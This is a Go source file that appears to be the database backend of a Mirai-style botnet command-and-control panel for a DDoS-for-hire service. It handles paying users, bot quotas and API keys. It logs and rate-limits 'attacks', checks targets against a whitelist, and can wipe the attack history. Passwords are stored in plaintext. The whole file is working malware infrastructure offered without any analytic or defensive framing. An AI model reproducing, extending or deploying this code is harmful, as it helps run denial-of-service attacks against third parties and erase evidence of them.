package main

import (
	"database/sql"
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"time"

	_ "github.com/go-sql-driver/mysql"
)

type Database struct {
	db *sql.DB
}

type AccountInfo struct {
	username string
	maxBots  int
	admin    int
}

func NewDatabase(dbAddr string, dbUser string, dbPassword string, dbName string) *Database {
	db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s)/%s", dbUser, dbPassword, dbAddr, dbName))
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println("\r\n")
	fmt.Println("\x1b[38;5;99mStarting ur fucking botnet")
	return &Database{db}
}

func (this *Database) TryLogin(username string, password string) (bool, AccountInfo) {
	rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE username = ? AND password = ? AND (wrc = 0 OR (UNIX_TIMESTAMP() - last_paid < `intvl` * 24 * 60 * 60))", username, password)
	if err != nil {
		fmt.Println(err)
		return false, AccountInfo{"", 0, 0}
	}
	defer rows.Close()

	if !rows.Next() {
		return false, AccountInfo{"", 0, 0}
	}

	var accInfo AccountInfo
	rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin)

	// Set user as online
	_, err = this.db.Exec("UPDATE users SET online = 1 WHERE username = ?", accInfo.username)
	if err != nil {
		fmt.Println("Error setting user online:", err)
		return true, accInfo
	}

	// Increment the online user count
	_, err = this.db.Exec("UPDATE counters SET online_count = online_count + 1 WHERE id = 1") // Assuming a 'counters' table exists
	if err != nil {
		fmt.Println("Error incrementing online user count:", err)
	}

	return true, accInfo
}

func (this *Database) Logout(username string) {
	// Set user as offline
	_, err := this.db.Exec("UPDATE users SET online = 0 WHERE username = ?", username)
	if err != nil {
		fmt.Println("Error setting user offline:", err)
	}

	// Decrement the online user count
	_, err = this.db.Exec("UPDATE counters SET online_count = online_count - 1 WHERE id = 1")
	if err != nil {
		fmt.Println("Error decrementing online user count:", err)
	}
}
func (this *Database) GetOnlineCount() (int, error) {
	var count int
	row := this.db.QueryRow("SELECT online_count FROM counters WHERE id = 1")
	err := row.Scan(&count)
	if err != nil {
		return 0, err
	}
	return count, nil
}
func (this *Database) ChangePass(username string, newPassword string) bool {
	// Ensure the new password is not empty
	if newPassword == "" {
		fmt.Println("New password cannot be empty")
		return false
	}

	// Prepare the SQL statement for the update
	result, err := this.db.Exec("UPDATE users SET password = ? WHERE username = ?", newPassword, username)
	if err != nil {
		fmt.Println("Error updating password:", err)
		return false
	}

	// Check if any rows were affected
	rowsAffected, err := result.RowsAffected()
	if err != nil {
		fmt.Println("Error checking rows affected:", err)
		return false
	}

	if rowsAffected == 0 {
		// If no rows were affected, the username does not exist
		fmt.Println("No user found with that username")
		return false
	}

	fmt.Println("Password successfully changed for user:", username)
	return true
}
func (this *Database) CreateUser(username string, password string, max_bots int, duration int, cooldown int) bool {
	rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false
	}
	this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 0, UNIX_TIMESTAMP(), ?, ?)", username, password, max_bots, cooldown, duration)
	return true
}

func (this *Database) createAdmin(username string, password string, max_bots int, duration int, cooldown int) bool {
	rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false
	}
	this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 1, UNIX_TIMESTAMP(), ?, ?)", username, password, max_bots, cooldown, duration)
	return true
}

func (this *Database) fetchAttacks() int {
	var count int
	row := this.db.QueryRow("SELECT COUNT(*) FROM history")
	err := row.Scan(&count)
	if err != nil {
		fmt.Println(err)
	}
	return count
}

func (this *Database) fetchUsers() int {
	var count int
	row := this.db.QueryRow("SELECT COUNT(*) FROM users")
	err := row.Scan(&count)
	if err != nil {
		fmt.Println(err)
	}
	return count
}

func (this *Database) fetchRunningAttacks() int {
	var count int
	row := this.db.QueryRow("SELECT COUNT(*) FROM history where (time_sent + duration) > UNIX_TIMESTAMP()")
	err := row.Scan(&count)
	if err != nil {
		fmt.Println(err)
	}
	return count
}

func (this *Database) removeUser(username string) bool {
	rows, err := this.db.Query("DELETE FROM users WHERE username = ?", username)
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false
	}
	this.db.Exec("DELETE FROM users WHERE username = ?", username)
	return true
}

func (this *Database) CleanLogs() bool {
	rows, err := this.db.Query("DELETE FROM history")
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false
	}
	this.db.Exec("DELETE FROM history")
	return true
}

func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
	rows, err := this.db.Query("SELECT prefix, netmask FROM whitelist")
	if err != nil {
		fmt.Println(err)
		return false
	}
	defer rows.Close()
	for rows.Next() {
		var prefix string
		var netmask uint8
		rows.Scan(&prefix, &netmask)

		// Parse prefix
		ip := net.ParseIP(prefix)
		ip = ip[12:]
		iWhitelistPrefix := binary.BigEndian.Uint32(ip)

		for aPNetworkOrder, aN := range attack.Targets {
			rvBuf := make([]byte, 4)
			binary.BigEndian.PutUint32(rvBuf, aPNetworkOrder)
			iAttackPrefix := binary.BigEndian.Uint32(rvBuf)
			if aN > netmask { // Whitelist is less specific than attack target
				if netshift(iWhitelistPrefix, netmask) == netshift(iAttackPrefix, netmask) {
					return true
				}
			} else if aN < netmask { // Attack target is less specific than whitelist
				if (iAttackPrefix >> aN) == (iWhitelistPrefix >> aN) {
					return true
				}
			} else { // Both target and whitelist have same prefix
				if iWhitelistPrefix == iAttackPrefix {
					return true
				}
			}
		}
	}
	return false
}

func (this *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {
	rows, err := this.db.Query("SELECT id, duration_limit, admin, cooldown FROM users WHERE username = ?", username)
	defer rows.Close()
	if err != nil {
		fmt.Println(err)
	}
	var userId, durationLimit, admin, cooldown uint32
	if !rows.Next() {
		return false, errors.New("Your access has been terminated")
	}
	rows.Scan(&userId, &durationLimit, &admin, &cooldown)

	if durationLimit != 0 && duration > durationLimit {
		return false, errors.New(fmt.Sprintf("Your max attack time is %d seconds.", durationLimit))
	}
	rows.Close()

	if admin == 0 {
		rows, err = this.db.Query("SELECT time_sent, duration FROM history WHERE user_id = ? AND (time_sent + duration + ?) > UNIX_TIMESTAMP()", userId, cooldown)
		if err != nil {
			fmt.Println(err)
		}
		if rows.Next() {
			var timeSent, historyDuration uint32
			rows.Scan(&timeSent, &historyDuration)
			return false, errors.New(fmt.Sprintf("Please wait %d seconds before sending another attack", (timeSent+historyDuration+cooldown)-uint32(time.Now().Unix())))
		}
	}

	this.db.Exec("INSERT INTO history (user_id, time_sent, duration, command, max_bots) VALUES (?, UNIX_TIMESTAMP(), ?, ?, ?)", userId, duration, fullCommand, maxBots)
	return true, nil
}

func (this *Database) CheckApiCode(apikey string) (bool, AccountInfo) {
	rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE api_key = ?", apikey)
	if err != nil {
		fmt.Println(err)
		return false, AccountInfo{"", 0, 0}
	}
	defer rows.Close()
	if !rows.Next() {
		return false, AccountInfo{"", 0, 0}
	}
	var accInfo AccountInfo
	rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin)
	return true, accInfo
}
